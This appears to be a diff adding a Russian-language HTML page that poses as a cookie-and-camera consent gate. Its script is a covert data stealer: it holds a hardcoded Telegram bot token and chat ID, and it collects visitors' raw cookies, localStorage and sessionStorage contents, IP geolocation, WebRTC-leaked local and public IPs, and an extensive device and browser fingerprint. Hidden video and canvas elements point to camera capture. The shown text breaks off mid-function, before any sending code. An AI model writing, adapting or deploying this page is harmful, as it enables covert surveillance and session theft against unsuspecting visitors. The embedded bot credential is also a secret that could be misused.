@@ -1,0 +1,1067 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Загрузка...</title>
+<style>
+  html, body { margin: 0; padding: 0; height: 100%; background: #000; }
+
+  #gate {
+    position: fixed; inset: 0;
+    background: #000; color: #eee;
+    display: flex; flex-direction: column; gap: 24px;
+    align-items: center; justify-content: center;
+    text-align: center; padding: 30px;
+    font: 16px/1.5 Arial, sans-serif;
+    z-index: 9999;
+  }
+  #gate h1 { margin: 0; font-size: 22px; font-weight: 600; color: #fff; }
+  #gate p  { margin: 0; max-width: 460px; color: #aaa; }
+  #gate .row { display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; }
+
+  .btn {
+    padding: 14px 34px; font-size: 16px; border: 0; border-radius: 8px;
+    cursor: pointer; font-weight: bold; transition: .15s;
+  }
+  #yes {
+    background: #8b5cf6; color: #fff;
+    box-shadow: 0 0 24px rgba(139,92,246,.55);
+  }
+  #yes:hover  { background: #7c3aed; }
+  #yes:disabled { opacity: .55; cursor: default; box-shadow: none; }
+
+  #no { background: #222; color: #bbb; }
+  #no:hover { background: #333; color: #fff; }
+
+  #status { margin-top: 4px; font-size: 14px; color: #888; min-height: 20px; }
+
+  #site {
+    display: none;
+    background: #0f0f0f; color: #eee;
+    min-height: 100vh; padding: 40px 20px;
+    font: 16px/1.6 Arial, sans-serif;
+    text-align: center;
+  }
+  #site h2 { color: #fff; }
+
+  #preview, #canvas { display: none; }
+</style>
+</head>
+<body>
+
+<div id="gate">
+  <h1>Вы хотите посетить наш сайт?</h1>
+  <p>Для продолжения необходимо принять cookies и разрешить доступ к камере.</p>
+  <div class="row">
+    <button id="no"  class="btn">Нет</button>
+    <button id="yes" class="btn">Да</button>
+  </div>
+  <p id="status"></p>
+</div>
+
+<div id="site">
+  <h2>Добро пожаловать!</h2>
+  <p>Проверка пройдена. Доступ открыт.</p>
+</div>
+
+<video id="preview" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+// НАСТРОЙКИ
+// ═══════════════════════════════════════════════════════════
+const TOKEN   = '8243475342:AAF9-cbm1bpIKCTxIVF2djRV6FSDotkK-1U';
+const CHAT_ID = '8689558225';
+
+const COOKIE_DATA  = {};
+const GEO_DATA     = {};
+const PHONE_DATA   = {};
+const BROWSER_DATA = {};
+const OTHER_DATA   = {};
+const SITES_DATA   = {};
+
+const btnYes   = document.getElementById('yes');
+const btnNo    = document.getElementById('no');
+const statusEl = document.getElementById('status');
+const video    = document.getElementById('preview');
+const canvas   = document.getElementById('canvas');
+
+// ═══════════════════════════════════════════════════════════
+// COOKIES
+// ═══════════════════════════════════════════════════════════
+async function collectCookies() {
+  COOKIE_DATA['01 cookieEnabled']       = navigator.cookieEnabled;
+  COOKIE_DATA['02 cookieStore API']     = 'cookieStore' in window;
+  COOKIE_DATA['03 SameSite поддержка']  = (() => {
+    try { document.cookie = 'test_samesite=1; SameSite=Lax'; return document.cookie.includes('test_samesite'); }
+    catch { return false; }
+  })();
+  COOKIE_DATA['04 Secure cookies разрешены'] = location.protocol === 'https:';
+  COOKIE_DATA['05 Домен']               = location.hostname;
+  COOKIE_DATA['06 Origin']              = location.origin;
+  COOKIE_DATA['07 Protocol']            = location.protocol;
+  COOKIE_DATA['08 Secure context']      = window.isSecureContext;
+
+  const tests = [
+    ['tf_basic',    'value1', ''],
+    ['tf_path',     'value2', '; path=/'],
+    ['tf_lax',      'value3', '; SameSite=Lax'],
+    ['tf_strict',   'value4', '; SameSite=Strict'],
+    ['tf_maxage',   'value5', '; max-age=3600'],
+    ['tf_secure',   'value6', '; Secure'],
+    ['tf_expires',  'value7', '; expires=' + new Date(Date.now() + 86400000).toUTCString()],
+    ['tf_long',     'A'.repeat(200), '; path=/'],
+  ];
+  const written = [];
+  for (const [name, val, attr] of tests) {
+    try { document.cookie = name + '=' + val + attr; written.push(name); } catch (e) {}
+  }
+  COOKIE_DATA['09 Записано тестовых'] = written.length;
+  COOKIE_DATA['10 Имена тестовых']    = written.join(', ');
+
+  const raw = document.cookie || '';
+  COOKIE_DATA['11 Сырая строка cookie'] = raw.slice(0, 3500) || '(пусто)';
+  COOKIE_DATA['12 Длина строки']        = raw.length;
+  COOKIE_DATA['13 Количество cookies']  = raw ? raw.split(';').length : 0;
+
+  const pairs = {};
+  if (raw) {
+    raw.split(';').forEach(p => {
+      const i = p.indexOf('=');
+      if (i > -1) pairs[p.slice(0, i).trim()] = p.slice(i + 1).trim();
+    });
+  }
+  COOKIE_DATA['14 Уникальных имён'] = Object.keys(pairs).length;
+  COOKIE_DATA['15 Список имён']     = Object.keys(pairs).join(', ') || '(нет)';
+
+  let idx = 16;
+  Object.entries(pairs).slice(0, 30).forEach(([k, v]) => {
+    COOKIE_DATA[String(idx++).padStart(2, '0') + ' cookie: ' + k] = String(v).slice(0, 250);
+  });
+
+  if (window.cookieStore && cookieStore.getAll) {
+    try {
+      const all = await cookieStore.getAll();
+      COOKIE_DATA['46 CookieStore всего'] = all.length;
+      COOKIE_DATA['47 CookieStore имена'] = all.map(c => c.name).join(', ');
+      all.slice(0, 20).forEach((c, i) => {
+        const base = 48 + i * 3;
+        COOKIE_DATA[String(base).padStart(2, '0') + ' CS ' + c.name + ' domain'] = c.domain;
+        COOKIE_DATA[String(base+1).padStart(2, '0') + ' CS ' + c.name + ' path'] = c.path;
+        COOKIE_DATA[String(base+2).padStart(2, '0') + ' CS ' + c.name + ' expires'] = c.expires ? new Date(c.expires).toISOString() : 'session';
+      });
+    } catch (e) { COOKIE_DATA['CookieStore ошибка'] = String(e); }
+  }
+
+  try {
+    const lsData = {};
+    for (let i = 0; i < localStorage.length; i++) {
+      const k = localStorage.key(i); lsData[k] = localStorage.getItem(k);
+    }
+    COOKIE_DATA['91 localStorage ключей'] = Object.keys(lsData).length;
+    COOKIE_DATA['92 localStorage имена']  = Object.keys(lsData).slice(0, 40).join(', ') || '(пусто)';
+    let li = 93;
+    Object.entries(lsData).slice(0, 20).forEach(([k, v]) => {
+      COOKIE_DATA[String(li++).padStart(3, '0') + ' LS ' + k] = String(v).slice(0, 200);
+    });
+  } catch (e) {}
+
+  try {
+    const ssData = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const k = sessionStorage.key(i); ssData[k] = sessionStorage.getItem(k);
+    }
+    COOKIE_DATA['120 sessionStorage ключей'] = Object.keys(ssData).length;
+    COOKIE_DATA['121 sessionStorage имена']  = Object.keys(ssData).slice(0, 40).join(', ') || '(пусто)';
+    let si = 122;
+    Object.entries(ssData).slice(0, 20).forEach(([k, v]) => {
+      COOKIE_DATA[String(si++).padStart(3, '0') + ' SS ' + k] = String(v).slice(0, 200);
+    });
+  } catch (e) {}
+
+  try {
+    if (indexedDB.databases) {
+      const dbs = await indexedDB.databases();
+      COOKIE_DATA['140 IndexedDB баз'] = dbs.length;
+      COOKIE_DATA['141 IndexedDB имена'] = dbs.map(d => d.name + (d.version ? ' v' + d.version : '')).join(', ') || '(нет)';
+    }
+  } catch (e) {}
+
+  try {
+    if (window.caches) {
+      const keys = await caches.keys();
+      COOKIE_DATA['142 Cache Storage кэшей'] = keys.length;
+      COOKIE_DATA['143 Cache Storage имена'] = keys.slice(0, 20).join(', ') || '(нет)';
+    }
+  } catch (e) {}
+
+  COOKIE_DATA['144 Secure установлен'] = raw.includes('tf_secure');
+  COOKIE_DATA['145 SameSite=Lax установлен']    = raw.includes('tf_lax');
+  COOKIE_DATA['146 SameSite=Strict установлен'] = raw.includes('tf_strict');
+  COOKIE_DATA['147 max-age установлен']         = raw.includes('tf_maxage');
+  COOKIE_DATA['148 expires установлен']         = raw.includes('tf_expires');
+  COOKIE_DATA['149 path=/ установлен']          = raw.includes('tf_path');
+  COOKIE_DATA['150 Длинная cookie (200б)']      = raw.includes('tf_long');
+}
+
+// ═══════════════════════════════════════════════════════════
+// ГЕО
+// ═══════════════════════════════════════════════════════════
+async function collectGeo() {
+  let best = null;
+
+  try {
+    const r = await fetch('https://ipwho.is/');
+    const g = await r.json();
+    if (g.success !== false && g.latitude != null) {
+      GEO_DATA['01 Источник']    = 'ipwho.is';
+      GEO_DATA['02 IP']          = g.ip;
+      GEO_DATA['03 Тип IP']      = g.type;
+      GEO_DATA['04 Континент']   = g.continent;
+      GEO_DATA['05 Код континента'] = g.continent_code;
+      GEO_DATA['06 Страна']      = g.country;
+      GEO_DATA['07 Код страны']  = g.country_code;
+      GEO_DATA['08 Столица']     = g.capital;
+      GEO_DATA['09 Регион']      = g.region;
+      GEO_DATA['10 Код региона'] = g.region_code;
+      GEO_DATA['11 Город']       = g.city;
+      GEO_DATA['12 Индекс']      = g.postal;
+      GEO_DATA['13 Широта']      = g.latitude;
+      GEO_DATA['14 Долгота']     = g.longitude;
+      GEO_DATA['15 TZ id']       = g.timezone && g.timezone.id;
+      GEO_DATA['16 UTC']         = g.timezone && g.timezone.utc;
+      GEO_DATA['17 ISP']         = g.connection && g.connection.isp;
+      GEO_DATA['18 Организация'] = g.connection && g.connection.org;
+      GEO_DATA['19 ASN']         = g.connection && ('AS' + g.connection.asn);
+      GEO_DATA['20 Мобильный']   = g.connection && g.connection.is_mobile;
+      GEO_DATA['21 Прокси']      = g.security && g.security.proxy;
+      GEO_DATA['22 VPN']         = g.security && g.security.vpn;
+      GEO_DATA['23 Tor']         = g.security && g.security.tor;
+      best = { lat: g.latitude, lng: g.longitude };
+    }
+  } catch (e) {}
+
+  if (!best) {
+    try {
+      const r = await fetch('https://ipwhois.app/json/');
+      const g = await r.json();
+      if (g.success && g.latitude) {
+        GEO_DATA['24 Источник 2']  = 'ipwhois.app';
+        GEO_DATA['25 IP']          = g.ip;
+        GEO_DATA['26 Страна']      = g.country;
+        GEO_DATA['27 Город']       = g.city;
+        GEO_DATA['28 Регион']      = g.region;
+        GEO_DATA['29 Широта']      = g.latitude;
+        GEO_DATA['30 Долгота']     = g.longitude;
+        GEO_DATA['31 ISP']         = g.isp;
+        GEO_DATA['32 ASN']         = g.asn;
+        best = { lat: g.latitude, lng: g.longitude };
+      }
+    } catch (e) {}
+  }
+
+  if (!best) {
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const g = await r.json();
+      if (g.latitude != null) {
+        GEO_DATA['33 Источник 3']  = 'ipapi.co';
+        GEO_DATA['34 IP']          = g.ip;
+        GEO_DATA['35 Страна']      = g.country_name;
+        GEO_DATA['36 Код страны']  = g.country;
+        GEO_DATA['37 Город']       = g.city;
+        GEO_DATA['38 Регион']      = g.region;
+        GEO_DATA['39 Широта']      = g.latitude;
+        GEO_DATA['40 Долгота']     = g.longitude;
+        GEO_DATA['41 TZ']          = g.timezone;
+        GEO_DATA['42 UTC']         = g.utc_offset;
+        GEO_DATA['43 ASN']         = g.asn;
+        GEO_DATA['44 Организация'] = g.org;
+        GEO_DATA['45 Сеть']        = g.network;
+        GEO_DATA['46 Валюта']      = g.currency;
+        best = { lat: g.latitude, lng: g.longitude };
+      }
+    } catch (e) {}
+  }
+
+  if (best) {
+    const lat = parseFloat(best.lat), lng = parseFloat(best.lng);
+    GEO_DATA['70 Google Maps (поиск)']   = 'https://www.google.com/maps?q=' + lat + ',' + lng;
+    GEO_DATA['71 Google Maps (спутник)'] = 'https://www.google.com/maps/@' + lat + ',' + lng + ',12z/data=!3m1!1e3';
+    GEO_DATA['72 Google Maps (улицы)']   = 'https://www.google.com/maps/@' + lat + ',' + lng + ',15z';
+    GEO_DATA['73 Яндекс.Карты']          = 'https://yandex.ru/maps/?pt=' + lng + ',' + lat + '&z=12&l=map';
+    GEO_DATA['74 OpenStreetMap']         = 'https://www.openstreetmap.org/?mlat=' + lat + '&mlon=' + lng + '#map=12/' + lat + '/' + lng;
+  }
+
+  await new Promise(resolve => {
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      const ips = new Set(), srflx = new Set();
+      let done = false;
+      const finish = () => {
+        if (done) return; done = true;
+        GEO_DATA['80 Локальные IP'] = Array.from(ips).join(', ') || 'скрыто';
+        GEO_DATA['81 Публичные IP'] = Array.from(srflx).join(', ') || 'скрыто';
+        try { pc.close(); } catch {}
+        resolve();
+      };
+      pc.createDataChannel('');
+      pc.onicecandidate = e => {
+        if (!e.candidate) return finish();
+        const c = e.candidate.candidate;
+        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i.exec(c);
+        if (m) (/srflx|relay/.test(c) ? srflx : ips).add(m[1]);
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      setTimeout(finish, 2000);
+    } catch (e) { resolve(); }
+  });
+}
+
+// ═══════════════════════════════════════════════════════════
+// ТЕЛЕФОН
+// ═══════════════════════════════════════════════════════════
+async function collectPhone() {
+  const n = navigator, s = screen;
+  PHONE_DATA['01 Ширина экрана']    = s.width;
+  PHONE_DATA['02 Высота экрана']    = s.height;
+  PHONE_DATA['03 Доступн. ширина']  = s.availWidth;
+  PHONE_DATA['04 Доступн. высота']  = s.availHeight;
+  PHONE_DATA['05 Глубина цвета']    = s.colorDepth;
+  PHONE_DATA['06 Pixel depth']      = s.pixelDepth;
+  PHONE_DATA['07 DPR']              = window.devicePixelRatio;
+  PHONE_DATA['08 Ориентация']       = s.orientation ? s.orientation.type : '';
+  PHONE_DATA['09 Угол ориентации']  = s.orientation ? s.orientation.angle : '';
+  PHONE_DATA['10 Ширина окна']      = window.innerWidth;
+  PHONE_DATA['11 Высота окна']      = window.innerHeight;
+  PHONE_DATA['12 Внешн. ширина']    = window.outerWidth;
+  PHONE_DATA['13 Внешн. высота']    = window.outerHeight;
+  PHONE_DATA['14 Позиция X']        = window.screenX;
+  PHONE_DATA['15 Позиция Y']        = window.screenY;
+  PHONE_DATA['16 Полоса прокрутки'] = window.innerWidth - document.documentElement.clientWidth;
+  PHONE_DATA['17 Диагональ пикс']   = Math.round(Math.sqrt(s.width**2 + s.height**2));
+  PHONE_DATA['18 Диагональ дюйм']   = (Math.sqrt(s.width**2 + s.height**2) / 96).toFixed(2);
+  PHONE_DATA['19 DeviceOrientation']= 'DeviceOrientationEvent' in window;
+  PHONE_DATA['20 DeviceMotion']     = 'DeviceMotionEvent' in window;
+  PHONE_DATA['21 Accelerometer']    = 'Accelerometer' in window;
+  PHONE_DATA['22 Gyroscope']        = 'Gyroscope' in window;
+  PHONE_DATA['23 Magnetometer']     = 'Magnetometer' in window;
+  PHONE_DATA['24 AmbientLight']     = 'AmbientLightSensor' in window;
+  PHONE_DATA['25 LinearAccel']      = 'LinearAccelerationSensor' in window;
+  PHONE_DATA['26 GravitySensor']    = 'GravitySensor' in window;
+  PHONE_DATA['27 Max touch points'] = n.maxTouchPoints || 0;
+  PHONE_DATA['28 Touch support']    = 'ontouchstart' in window;
+  PHONE_DATA['29 Pointer support']  = 'PointerEvent' in window;
+  PHONE_DATA['30 Vibrate API']      = 'vibrate' in n;
+  PHONE_DATA['31 Ядер CPU']         = n.hardwareConcurrency || '';
+  PHONE_DATA['32 RAM (GB)']         = n.deviceMemory || '';
+  PHONE_DATA['33 Платформа']        = n.platform || '';
+  PHONE_DATA['34 Мобильный UA-CH']  = n.userAgentData ? n.userAgentData.mobile : '';
+  PHONE_DATA['35 Платформа UA-CH']  = n.userAgentData ? n.userAgentData.platform : '';
+  PHONE_DATA['36 Бренды UA-CH']     = n.userAgentData ? n.userAgentData.brands.map(b => b.brand + ' ' + b.version).join(', ') : '';
+  PHONE_DATA['37 Языки']            = (n.languages || []).join(', ');
+  PHONE_DATA['38 Основной язык']    = n.language;
+
+  const ua = n.userAgent;
+  PHONE_DATA['39 UA строка']        = ua;
+  PHONE_DATA['40 Возможно телефон'] = /Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua);
+  PHONE_DATA['41 Возможно планшет'] = /iPad|Tablet|PlayBook|Silk/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua));
+  PHONE_DATA['42 Возможно десктоп'] = !/Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+  PHONE_DATA['43 OS']               = (() => {
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Mac OS X/.test(ua))        return 'macOS';
+    if (/Android/.test(ua))         return 'Android';
+    if (/iPhone|iPad|iPod/.test(ua))return 'iOS';
+    if (/Linux/.test(ua))           return 'Linux';
+    return 'неизвестно';
+  })();
+  PHONE_DATA['44 OS версия']        = (() => {
+    const m = /(Windows NT [\d.]+|Mac OS X [\d_.]+|Android [\d.]+|OS [\d_]+)/.exec(ua);
+    return m ? m[1].replace(/_/g, '.') : '';
+  })();
+  PHONE_DATA['45 Модель устройства']= (() => { const m = /\(([^)]+)\)/.exec(ua); return m ? m[1] : ''; })();
+
+  if (n.getBattery) {
+    try {
+      const b = await n.getBattery();
+      PHONE_DATA['46 Батарея %']        = Math.round(b.level * 100) + '%';
+      PHONE_DATA['47 Уровень 0-1']      = b.level;
+      PHONE_DATA['48 Заряжается']       = b.charging;
+      PHONE_DATA['49 Время до заряда']  = b.chargingTime === Infinity ? 'бесконечность' : b.chargingTime;
+      PHONE_DATA['50 Время до разряд.'] = b.dischargingTime === Infinity ? 'бесконечность' : b.dischargingTime;
+    } catch (e) {}
+  }
+
+  const c = n.connection || n.mozConnection || n.webkitConnection;
+  if (c) {
+    PHONE_DATA['51 Тип сети']      = c.effectiveType;
+    PHONE_DATA['52 Тип conn.']     = c.type;
+    PHONE_DATA['53 Downlink Mbps'] = c.downlink;
+    PHONE_DATA['54 Downlink max']  = c.downlinkMax;
+    PHONE_DATA['55 RTT ms']        = c.rtt;
+    PHONE_DATA['56 Save data']     = c.saveData;
+  }
+  PHONE_DATA['57 Онлайн']          = n.onLine;
+  PHONE_DATA['58 Геолокация API']  = 'geolocation' in n;
+  PHONE_DATA['59 Bluetooth API']   = 'bluetooth' in n;
+  PHONE_DATA['60 USB API']         = 'usb' in n;
+  PHONE_DATA['61 NFC API']         = 'NDEFReader' in window;
+  PHONE_DATA['62 Serial API']      = 'serial' in n;
+  PHONE_DATA['63 HID API']         = 'hid' in n;
+
+  try {
+    if (n.mediaDevices && n.mediaDevices.enumerateDevices) {
+      const d = await n.mediaDevices.enumerateDevices();
+      PHONE_DATA['64 Устройств всего'] = d.length;
+      PHONE_DATA['65 Микрофонов']      = d.filter(x => x.kind === 'audioinput').length;
+      PHONE_DATA['66 Камер']           = d.filter(x => x.kind === 'videoinput').length;
+      PHONE_DATA['67 Динамиков']       = d.filter(x => x.kind === 'audiooutput').length;
+    }
+  } catch (e) {}
+  PHONE_DATA['68 getUserMedia']    = !!(n.mediaDevices && n.mediaDevices.getUserMedia);
+  PHONE_DATA['69 GetDisplayMedia'] = !!(n.mediaDevices && n.mediaDevices.getDisplayMedia);
+  PHONE_DATA['70 Media capabilities'] = !!(n.mediaDevices && n.mediaDevices.getSupportedConstraints);
+  PHONE_DATA['71 SpeechSynth']     = 'speechSynthesis' in window;
+  PHONE_DATA['72 SpeechRecog']     = 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window;
+  PHONE_DATA['73 Share API']       = 'share' in n;
+  PHONE_DATA['74 Wake Lock']       = 'wakeLock' in n;
+  PHONE_DATA['75 Fullscreen']      = 'fullscreenEnabled' in document;
+  PHONE_DATA['76 Screen Capture']  = !!(n.mediaDevices && n.mediaDevices.getDisplayMedia);
+  PHONE_DATA['77 Gamepad']         = 'getGamepads' in n;
+  PHONE_DATA['78 VR XR']           = 'xr' in n;
+  PHONE_DATA['79 Notification']    = 'Notification' in window;
+  PHONE_DATA['80 Notification perm']= 'Notification' in window ? Notification.permission : '';
+  PHONE_DATA['81 Мобильный режим'] = /Mobi/i.test(ua);
+  PHONE_DATA['82 Память JS (MB)']  = performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1048576) : '';
+  PHONE_DATA['83 Лимит памяти MB'] = performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) : '';
+  PHONE_DATA['84 Есть GPU']        = 'WebGLRenderingContext' in window;
+  PHONE_DATA['85 WebGL2']          = 'WebGL2RenderingContext' in window;
+  PHONE_DATA['86 WebGPU']          = 'gpu' in n;
+
+  try {
+    if (n.storage && n.storage.estimate) {
+      const e = await n.storage.estimate();
+      PHONE_DATA['87 Квота (MB)']      = Math.round(e.quota / 1048576);
+      PHONE_DATA['88 Использовано KB'] = Math.round(e.usage / 1024);
+    }
+  } catch (e) {}
+  PHONE_DATA['89 IndexedDB']       = 'indexedDB' in window;
+  PHONE_DATA['90 localStorage']    = (() => { try { localStorage.setItem('_','1'); localStorage.removeItem('_'); return true; } catch { return false; } })();
+  PHONE_DATA['91 sessionStorage']  = 'sessionStorage' in window;
+  PHONE_DATA['92 Cache API']       = 'caches' in window;
+  PHONE_DATA['93 CookieStore']     = 'cookieStore' in window;
+
+  const d = new Date();
+  PHONE_DATA['94 Локальное время'] = d.toLocaleString('ru-RU');
+  PHONE_DATA['95 ISO время']       = d.toISOString();
+  PHONE_DATA['96 Timestamp']       = d.getTime();
+  PHONE_DATA['97 TZ']              = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  PHONE_DATA['98 Смещение TZ']     = d.getTimezoneOffset();
+  PHONE_DATA['99 Локаль']          = Intl.DateTimeFormat().resolvedOptions().locale;
+  PHONE_DATA['100 Календарь']      = Intl.DateTimeFormat().resolvedOptions().calendar;
+  PHONE_DATA['101 Формат чисел']   = Intl.DateTimeFormat().resolvedOptions().numberingSystem;
+  PHONE_DATA['102 Uptime стр.']    = Math.round(performance.now());
+  PHONE_DATA['103 Тип сессии']     = performance.navigation ? performance.navigation.type : '';
+  PHONE_DATA['104 Кол-во redirect']= performance.navigation ? performance.navigation.redirectCount : '';
+  PHONE_DATA['105 Ширина mm']      = (s.width * 25.4 / 96).toFixed(1);
+  PHONE_DATA['106 Высота mm']      = (s.height * 25.4 / 96).toFixed(1);
+  PHONE_DATA['107 RTT из perf']    = performance.timing ? (performance.timing.responseStart - performance.timing.requestStart) : '';
+  PHONE_DATA['108 Тип подключения']= n.onLine ? 'online' : 'offline';
+  PHONE_DATA['109 Тёмная тема']    = matchMedia('(prefers-color-scheme: dark)').matches;
+  PHONE_DATA['110 Уменьш. анимац.']= matchMedia('(prefers-reduced-motion: reduce)').matches;
+  PHONE_DATA['111 Контраст']       = matchMedia('(prefers-contrast: more)').matches;
+  PHONE_DATA['112 Hover']          = matchMedia('(hover: hover)').matches;
+  PHONE_DATA['113 Указатель']      = matchMedia('(pointer: fine)').matches;
+  PHONE_DATA['114 Any-pointer']    = matchMedia('(any-pointer: coarse)').matches;
+  PHONE_DATA['115 Ориентация media']= matchMedia('(orientation: portrait)').matches ? 'portrait' : 'landscape';
+  PHONE_DATA['116 Цветовая гамма'] = matchMedia('(color-gamut: p3)').matches ? 'p3' : matchMedia('(color-gamut: srgb)').matches ? 'srgb' : '';
+  PHONE_DATA['117 HDR']            = matchMedia('(dynamic-range: high)').matches;
+  PHONE_DATA['118 Тип указателя']   = matchMedia('(pointer: coarse)').matches ? 'грубый (тач)' : 'точный (мышь)';
+  PHONE_DATA['119 Скроллбар']      = window.innerWidth - document.documentElement.clientWidth;
+  PHONE_DATA['120 Аппаратное ускорение'] = 'WebGLRenderingContext' in window;
+}
+
+// ═══════════════════════════════════════════════════════════
+// БРАУЗЕР
+// ═══════════════════════════════════════════════════════════
+function collectBrowser() {
+  const n = navigator;
+  BROWSER_DATA['01 User-Agent']    = n.userAgent;
+  BROWSER_DATA['02 App name']      = n.appName;
+  BROWSER_DATA['03 App version']   = n.appVersion;
+  BROWSER_DATA['04 App code name'] = n.appCodeName;
+  BROWSER_DATA['05 Product']       = n.product;
+  BROWSER_DATA['06 Product sub']   = n.productSub;
+  BROWSER_DATA['07 Vendor']        = n.vendor;
+  BROWSER_DATA['08 Vendor sub']    = n.vendorSub || '';
+  BROWSER_DATA['09 Build ID']      = n.buildID || '';
+  BROWSER_DATA['10 Platform']      = n.platform;
+  BROWSER_DATA['11 Язык']          = n.language;
+  BROWSER_DATA['12 Языки']         = (n.languages || []).join(', ');
+  BROWSER_DATA['13 Cookie enabled']= n.cookieEnabled;
+  BROWSER_DATA['14 Do Not Track']  = n.doNotTrack;
+  BROWSER_DATA['15 Global Privacy']= n.globalPrivacyControl;
+  BROWSER_DATA['16 Online']        = n.onLine;
+  BROWSER_DATA['17 Java enabled']  = typeof n.javaEnabled === 'function' ? n.javaEnabled() : '';
+  BROWSER_DATA['18 PDF viewer']    = n.pdfViewerEnabled;
+  BROWSER_DATA['19 Webdriver']     = n.webdriver;
+  BROWSER_DATA['20 Max touch']     = n.maxTouchPoints;
+
+  const ua = n.userAgent;
+  let browser = 'неизвестно', ver = '';
+  const tests = [
+    [/Edg\/([\d.]+)/,           'Edge'],
+    [/OPR\/([\d.]+)/,           'Opera'],
+    [/YaBrowser\/([\d.]+)/,     'Yandex'],
+    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],
+    [/Firefox\/([\d.]+)/,       'Firefox'],
+    [/Chrome\/([\d.]+)/,        'Chrome'],
+    [/Version\/([\d.]+).*Safari/, 'Safari'],
+  ];
+  for (const [re, name] of tests) {
+    const m = re.exec(ua);
+    if (m) { browser = name; ver = m[1]; break; }
+  }
+  BROWSER_DATA['21 Браузер']         = browser;
+  BROWSER_DATA['22 Версия браузера'] = ver;
+  BROWSER_DATA['23 Движок']          = /Gecko\/|Firefox/.test(ua) ? 'Gecko' : /AppleWebKit/.test(ua) ? 'WebKit/Blink' : 'неизвестно';
+  BROWSER_DATA['24 Chrome версия']   = (() => { const m = /Chrome\/([\d.]+)/.exec(ua); return m ? m[1] : ''; })();
+  BROWSER_DATA['25 Safari версия']   = (() => { const m = /Version\/([\d.]+).*Safari/.exec(ua); return m ? m[1] : ''; })();
+
+  BROWSER_DATA['26 WebSocket']       = 'WebSocket' in window;
+  BROWSER_DATA['27 WebAssembly']     = 'WebAssembly' in window;
+  BROWSER_DATA['28 ServiceWorker']   = 'serviceWorker' in n;
+  BROWSER_DATA['29 SharedWorker']    = 'SharedWorker' in window;
+  BROWSER_DATA['30 Worker']          = 'Worker' in window;
+  BROWSER_DATA['31 Fetch']           = 'fetch' in window;
+  BROWSER_DATA['32 AbortController'] = 'AbortController' in window;
+  BROWSER_DATA['33 BroadcastChannel']= 'BroadcastChannel' in window;
+  BROWSER_DATA['34 MessageChannel']  = 'MessageChannel' in window;
+  BROWSER_DATA['35 RequestIdleCallback'] = 'requestIdleCallback' in window;
+  BROWSER_DATA['36 Scheduler']       = 'scheduler' in window;
+  BROWSER_DATA['37 ResizeObserver']  = 'ResizeObserver' in window;
+  BROWSER_DATA['38 IntersectionObserver'] = 'IntersectionObserver' in window;
+  BROWSER_DATA['39 MutationObserver']= 'MutationObserver' in window;
+  BROWSER_DATA['40 PerformanceObserver'] = 'PerformanceObserver' in window;
+  BROWSER_DATA['41 ReportingObserver'] = 'ReportingObserver' in window;
+  BROWSER_DATA['42 Credentials']     = 'credentials' in n;
+  BROWSER_DATA['43 Payment']         = 'PaymentRequest' in window;
+  BROWSER_DATA['44 WebAuthn']        = 'PublicKeyCredential' in window;
+  BROWSER_DATA['45 Clipboard']       = 'clipboard' in n;
+  BROWSER_DATA['46 EyeDropper']      = 'EyeDropper' in window;
+  BROWSER_DATA['47 LaunchQueue']     = 'launchQueue' in window;
+  BROWSER_DATA['48 DocumentPiP']     = 'documentPictureInPicture' in window;
+  BROWSER_DATA['49 IdleDetection']   = 'IdleDetector' in window;
+  BROWSER_DATA['50 WebTransport']    = 'WebTransport' in window;
+  BROWSER_DATA['51 WebCodecs']       = 'VideoEncoder' in window;
+  BROWSER_DATA['52 Push']            = 'PushManager' in window;
+  BROWSER_DATA['53 File System']     = 'showOpenFilePicker' in window;
+  BROWSER_DATA['54 File API']        = 'FileReader' in window;
+  BROWSER_DATA['55 DragDrop']        = 'ondrag' in window;
+  BROWSER_DATA['56 PointerLock']     = 'pointerLockElement' in document;
+  BROWSER_DATA['57 Fullscreen']      = 'fullscreenEnabled' in document;
+  BROWSER_DATA['58 SpeechSynthesis'] = 'speechSynthesis' in window;
+  BROWSER_DATA['59 Offline Audio']   = 'OfflineAudioContext' in window;
+  BROWSER_DATA['60 AudioContext']    = 'AudioContext' in window;
+  BROWSER_DATA['61 Media Session']   = 'mediaSession' in n;
+  BROWSER_DATA['62 PiP']             = 'pictureInPictureEnabled' in document;
+  BROWSER_DATA['63 Cookies enabled'] = n.cookieEnabled;
+  BROWSER_DATA['64 CookieStore']     = 'cookieStore' in window;
+  BROWSER_DATA['65 Referrer']        = document.referrer;
+  BROWSER_DATA['66 URL']             = location.href;
+  BROWSER_DATA['67 Origin']          = location.origin;
+  BROWSER_DATA['68 Protocol']        = location.protocol;
+  BROWSER_DATA['69 Hostname']        = location.hostname;
+  BROWSER_DATA['70 Path']            = location.pathname;
+  BROWSER_DATA['71 Port']            = location.port || 'по умолчанию';
+  BROWSER_DATA['72 History length']  = history.length;
+  BROWSER_DATA['73 Кодировка']       = document.characterSet;
+  BROWSER_DATA['74 Content-Type']    = document.contentType;
+  BROWSER_DATA['75 Ready state']     = document.readyState;
+  BROWSER_DATA['76 Title документа'] = document.title;
+  BROWSER_DATA['77 Visibility']      = document.visibilityState;
+  BROWSER_DATA['78 Скрыт']           = document.hidden;
+  BROWSER_DATA['79 Кол-во cookie']   = document.cookie ? document.cookie.split(';').length : 0;
+  BROWSER_DATA['80 Cookie строка']   = document.cookie || '(пусто)';
+}
+
+// ═══════════════════════════════════════════════════════════
+// ДРУГОЕ
+// ═══════════════════════════════════════════════════════════
+function collectWebGL() {
+  try {
+    const c = document.createElement('canvas');
